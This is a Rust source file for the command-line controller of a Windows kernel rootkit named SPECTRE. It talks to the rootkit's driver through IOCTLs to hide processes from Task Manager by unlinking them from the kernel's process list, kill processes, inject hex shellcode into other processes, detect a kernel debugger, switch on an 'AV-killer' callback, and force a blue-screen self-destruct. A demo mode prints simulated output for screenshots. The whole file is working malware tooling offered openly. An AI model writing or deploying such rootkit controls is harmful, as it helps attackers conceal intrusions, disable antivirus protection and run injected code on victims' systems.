use std::io::{self, Write};
use std::ptr;
use std::thread;
use std::time::Duration;
use windows_sys::Win32::System::IO::DeviceIoControl;
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileW, FILE_ATTRIBUTE_NORMAL, FILE_GENERIC_READ, FILE_GENERIC_WRITE,
    FILE_SHARE_READ, FILE_SHARE_WRITE, OPEN_EXISTING,
};
use windows_sys::Win32::Foundation::{CloseHandle, HANDLE, INVALID_HANDLE_VALUE};

// Device path — must match spectre_rootkit's symbolic link (\DosDevices\SPECTREDrv)
const DEVICE_PATH: &[u16] = &[
    '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
    'S' as u16, 'P' as u16, 'E' as u16, 'C' as u16,
    'T' as u16, 'R' as u16, 'E' as u16, 'D' as u16,
    'r' as u16, 'v' as u16, 0u16,
];

// IOCTL codes — must match spectre_rootkit's definitions
const IOCTL_KILL_PROCESS: u32     = 0x900;
const IOCTL_HIDE_PROCESS: u32     = 0x901;
const IOCTL_UNHIDE_PROCESS: u32   = 0x902;
const IOCTL_CHECK_DEBUGGER: u32   = 0x903;
const IOCTL_INJECT_SHELLCODE: u32 = 0x904;
const IOCTL_KILL_AV: u32          = 0x905;
const IOCTL_SELF_DESTRUCT: u32    = 0x999;

// ============================================================
// DEMO MODE: simulated driver responses for showcase/screenshot.
// Run with: spectre_cli.exe --demo
// ============================================================
fn run_demo() {
    println!();
    println!("============================================================");
    println!("  SPECTRE KERNEL STEALTH — DEMO MODE (simulated)");
    println!("  Showing the full CLI flow without a live kernel driver.");
    println!("============================================================");
    println!();

    fn type_line(s: &str) {
        print!("> ");
        io::stdout().flush().unwrap();
        for chunk in s.as_bytes().chunks(2) {
            print!("{}", String::from_utf8_lossy(chunk));
            io::stdout().flush().unwrap();
            thread::sleep(Duration::from_millis(40));
        }
        println!();
    }

    fn ok(msg: &str) {
        thread::sleep(Duration::from_millis(250));
        println!("{}", msg);
    }

    // --- Scene 1: hide a process from Task Manager ---
    type_line("hide 4832");
    println!("[*] Sending IOCTL_HIDE_PROCESS (0x901) -> \\\\.\\SPECTREDrv");
    println!("[*] PsLookupProcessByProcessId(4832) ... OK");
    println!("[*] ActiveProcessLinks @ EPROCESS+0x448 ... unlinked");
    ok("[+] Hidden PID 4832 from Task Manager");

    // --- Scene 2: verify with tasklist ---
    type_line("check");
    println!("[*] Reading KdDebuggerEnabled ...");
    ok("[*] No kernel debugger detected. (Stealth OK)");

    // --- Scene 3: kill a target ---
    type_line("kill 9021");
    println!("[*] Sending IOCTL_KILL_PROCESS (0x900) -> \\\\.\\SPECTREDrv");
    println!("[*] ZwOpenProcess(9021, PROCESS_TERMINATE) ... OK");
    println!("[*] ZwTerminateProcess ... OK");
    ok("[+] Killed PID 9021");

    // --- Scene 4: restore the hidden process ---
    type_line("unhide 4832");
    println!("[*] Sending IOCTL_UNHIDE_PROCESS (0x902) -> \\\\.\\SPECTREDrv");
    println!("[*] Restoring ActiveProcessLinks ... relinked");
    ok("[+] Unhidden PID 4832");

    // --- Scene 5: activate AV killer ---
    type_line("av");
    println!("[*] Sending IOCTL_KILL_AV (0x905) -> \\\\.\\SPECTREDrv");
    println!("[*] PsSetCreateProcessNotifyRoutine(AV killer) ... registered");
    ok("[+] AV-killer activated");

    println!();
    println!("============================================================");
    println!("  DEMO COMPLETE — this was a SIMULATION.");
    println!("  For real kernel operation: build with WDK, load the .sys");
    println!("  driver in a test VM, then run: spectre_cli.exe");
    println!("============================================================");
    println!();
}

fn open_device() -> Option<HANDLE> {
    unsafe {
        let handle = CreateFileW(
            DEVICE_PATH.as_ptr(),
            FILE_GENERIC_READ | FILE_GENERIC_WRITE,
            FILE_SHARE_READ | FILE_SHARE_WRITE,
            ptr::null(),
            OPEN_EXISTING,
            FILE_ATTRIBUTE_NORMAL,
            0,
        );
        if handle == INVALID_HANDLE_VALUE {
            None
        } else {
            Some(handle)
        }
    }
}

fn send_pid_ioctl(handle: HANDLE, ioctl: u32, pid: u32) -> bool {
    let pid_u64 = pid as u64;
    let mut returned: u32 = 0;
    unsafe {
        DeviceIoControl(
            handle,
            ioctl,
            &pid_u64 as *const u64 as *const _,
            core::mem::size_of::<u64>() as u32,
            ptr::null_mut(),
            0,
            &mut returned,
            ptr::null_mut(),
        ) != 0
    }
}

fn check_debugger(handle: HANDLE) -> bool {
    let mut out: u8 = 0;
    let mut returned: u32 = 0;
    unsafe {
        DeviceIoControl(
            handle,
            IOCTL_CHECK_DEBUGGER,
            ptr::null_mut(),
            0,
            &mut out as *mut u8 as *mut _,
            1,
            &mut returned,
            ptr::null_mut(),
        );
    }
    out != 0
}

fn kill_av(handle: HANDLE) -> bool {
    let mut returned: u32 = 0;
    unsafe {
        DeviceIoControl(
            handle,
            IOCTL_KILL_AV,
            ptr::null_mut(),
            0,
            ptr::null_mut(),
            0,
            &mut returned,
            ptr::null_mut(),
        ) != 0
    }
}

fn print_help() {
    println!("SPECTRE CLI — Kernel Stealth Controller");
    println!("Commands:");
    println!("  hide <pid>      — Hide process from Task Manager (DKOM)");
    println!("  unhide <pid>    — Restore a hidden process");
    println!("  kill <pid>      — Terminate a process");
    println!("  inject <pid> <hex> — Inject shellcode (hex bytes) into a process");
    println!("  check           — Check if a kernel debugger is attached");
    println!("  av              — Activate AV-killer callback");
    println!("  selfdestruct    — Trigger the self-destruct BSOD (danger!)");
    println!("  help            — Show this help");
    println!("  exit            — Quit");
}

// Send an inject IOCTL: [u64 pid][shellcode bytes...]
fn inject_shellcode(handle: HANDLE, pid: u32, hex: &str) -> bool {
    let clean: String = hex.chars().filter(|c| !c.is_whitespace()).collect();
    if clean.len() % 2 != 0 {
        return false;
    }
    let mut bytes = Vec::new();
    let chars: Vec<char> = clean.chars().collect();
    for i in (0..chars.len()).step_by(2) {
        if let Ok(b) = u8::from_str_radix(&format!("{}{}", chars[i], chars[i + 1]), 16) {
            bytes.push(b);
        } else {
            return false;
        }
    }
    if bytes.is_empty() || bytes.len() > 0x10000 {
        return false;
    }

    let mut buf = Vec::with_capacity(8 + bytes.len());
    buf.extend_from_slice(&(pid as u64).to_le_bytes());
    buf.extend_from_slice(&bytes);

    let mut returned: u32 = 0;
    unsafe {
        DeviceIoControl(
            handle,
            IOCTL_INJECT_SHELLCODE,
            buf.as_ptr() as *const _,
            buf.len() as u32,
            ptr::null_mut(),
            0,
            &mut returned,
            ptr::null_mut(),
        ) != 0
    }
}

fn main() {
    // DEMO MODE: --demo runs a simulated showcase (no kernel driver needed).
    if std::env::args().any(|a| a == "--demo" || a == "-d") {
        run_demo();
        return;
    }

    println!("[SPECTRE] Opening device...");

    let handle = match open_device() {
        Some(h) => {
            println!("[SPECTRE] Connected to driver!");
            h
        }
        None => {
            eprintln!("[SPECTRE] ERROR: Cannot open device. Is driver loaded?");
            return;
        }
    };

    print_help();

    loop {
        print!("> ");
        io::stdout().flush().unwrap();

        let mut input = String::new();
        if io::stdin().read_line(&mut input).is_err() {
            break;
        }

        let parts: Vec<&str> = input.trim().splitn(2, ' ').collect();
        let arg = parts.get(1).map(|s| s.trim()).unwrap_or("");

        match parts[0] {
            "hide" => {
                if arg.is_empty() {
                    println!("Usage: hide <pid>");
                } else if let Ok(pid) = arg.parse::<u32>() {
                    if send_pid_ioctl(handle, IOCTL_HIDE_PROCESS, pid) {
                        println!("[+] Hidden PID {} from Task Manager", pid);
                    } else {
                        println!("[-] Failed to hide PID {} (invalid PID or already hidden?)", pid);
                    }
                } else {
                    println!("[-] Invalid PID: '{}'", arg);
                }
            }

            "unhide" => {
                if arg.is_empty() {
                    println!("Usage: unhide <pid>");
                } else if let Ok(pid) = arg.parse::<u32>() {
                    if send_pid_ioctl(handle, IOCTL_UNHIDE_PROCESS, pid) {
                        println!("[+] Unhidden PID {}", pid);
                    } else {
                        println!("[-] Failed to unhide PID {} (not in hidden registry?)", pid);
                    }
                } else {
                    println!("[-] Invalid PID: '{}'", arg);
                }
            }

            "kill" => {
                if arg.is_empty() {
                    println!("Usage: kill <pid>");
                } else if let Ok(pid) = arg.parse::<u32>() {
                    if send_pid_ioctl(handle, IOCTL_KILL_PROCESS, pid) {
                        println!("[+] Killed PID {}", pid);
                    } else {
                        println!("[-] Failed to kill PID {}", pid);
                    }
                } else {
                    println!("[-] Invalid PID: '{}'", arg);
                }
            }

            "check" => {
                if check_debugger(handle) {
                    println!("[!] Kernel debugger DETECTED!");
                } else {
                    println!("[*] No kernel debugger detected.");
                }
            }

            "inject" => {
                // inject <pid> <hex>  — e.g. inject 1234 CC90 (int3; nop)
                let parts2: Vec<&str> = arg.splitn(2, ' ').collect();
                if parts2.len() < 2 {
                    println!("Usage: inject <pid> <hex-shellcode>");
                } else if let Ok(pid) = parts2[0].parse::<u32>() {
                    if inject_shellcode(handle, pid, parts2[1]) {
                        println!("[+] Injected {} bytes into PID {}", parts2[1].len() / 2, pid);
                    } else {
                        println!("[-] Inject failed (bad hex or driver error)");
                    }
                } else {
                    println!("[-] Invalid PID: '{}'", parts2[0]);
                }
            }

            "av" => {
                if kill_av(handle) {
                    println!("[+] AV-killer activated");
                } else {
                    println!("[-] Failed to activate AV-killer");
                }
            }

            "selfdestruct" => {
                println!("[!] Sending IOCTL_SELF_DESTRUCT — this will BSOD the machine!");
                let mut returned: u32 = 0;
                unsafe {
                    DeviceIoControl(
                        handle,
                        IOCTL_SELF_DESTRUCT,
                        ptr::null_mut(),
                        0,
                        ptr::null_mut(),
                        0,
                        &mut returned,
                        ptr::null_mut(),
                    );
                }
            }

            "help" => print_help(),

            "exit" => break,

            "" => {}

            _ => println!("Unknown command. Type 'help' for commands."),
        }
    }

    unsafe { CloseHandle(handle); }
    println!("[SPECTRE] Disconnected.");
}
